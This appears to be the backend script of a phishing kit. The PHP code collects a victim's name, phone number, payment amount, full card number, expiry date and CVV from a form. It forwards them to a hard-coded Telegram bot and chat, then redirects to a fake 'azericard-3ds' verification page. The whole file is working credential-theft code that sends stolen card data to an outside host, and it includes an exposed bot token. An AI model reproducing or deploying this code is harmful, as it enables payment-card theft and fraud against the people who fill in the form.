<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(403); exit('Access Denied'); }

$amount = $_POST['amount'] ?? '';
$name   = $_POST['name'] ?? '';
$phone  = $_POST['phone'] ?? '';
$card   = $_POST['card'] ?? '';
$expdate = $_POST['expdate'] ?? '';
$cvv    = $_POST['cvv'] ?? '';

$botToken = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
$chatId   = '-1004326178006';

$message = "💳 Yeni Sifariş (Kart):\n";
$message .= "Ad: $name\n";
$message .= "Nömrə: $phone\n";
$message .= "Məbləğ: $amount AZN\n";
$message .= "Kart: $card\n";
$message .= "Tarix: $expdate\n";
$message .= "CVV: $cvv";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
@file_get_contents($url);

header("Location: azericard-3ds.html?amount=" . urlencode($amount));
exit();
?>
